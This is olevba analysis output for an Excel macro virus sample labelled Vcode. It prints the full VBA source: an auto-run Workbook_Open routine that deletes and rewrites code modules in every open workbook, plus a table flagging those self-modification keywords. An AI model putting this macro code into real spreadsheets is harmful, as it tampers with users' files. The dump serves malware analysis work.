olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Vcode-10e7d01dc8362d408f1c6fdb11f19e4a4cc0f9fa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Vcode-10e7d01dc8362d408f1c6fdb11f19e4a4cc0f9fa - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
On Error Resume Next
final = False
For i = 1 To Workbooks.Count
For j = 1 To Workbooks(i).VBProject.VBComponents.Count
flag = False
vvcode = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.Lines(1, 1)
If vvcode = "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" Then
  flag = True
  final = True
End If

eline = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines

  
If flag = True Then
Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.DeleteLines 1, eline
End If
Next j
Next i

For i = 1 To Workbooks.Count
vcount = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.CountOfLines
vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, vcount)
If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.AddFromString (vcode)
Next i

If final = True Then MsgBox "hjb№ЩАМ·ЇЅє °Й·Бј­ ДЎ·бїП·бЗЯЅАґПґЩ.", vbOKOnly

End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
final = False
For i = 1 To Workbooks.Count
For j = 1 To Workbooks(i).VBProject.VBComponents.Count
flag = False
vvcode = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.Lines(1, 1)
If vvcode = "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" Then
  flag = True
  final = True
End If

eline = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines

  
If flag = True Then
Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.DeleteLines 1, eline
End If
Next j
Next i

For i = 1 To Workbooks.Count
vcount = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.CountOfLines
vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, vcount)
If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.AddFromString (vcode)
Next i

If final = True Then MsgBox "hjb№ЩАМ·ЇЅє °Й·Бј­ ДЎ·бїП·бЗЯЅАґПґЩ.", vbOKOnly

End Sub



-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Vcode-10e7d01dc8362d408f1c6fdb11f19e4a4cc0f9fa - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Vcode-10e7d01dc8362d408f1c6fdb11f19e4a4cc0f9fa - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Vcode-10e7d01dc8362d408f1c6fdb11f19e4a4cc0f9fa - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
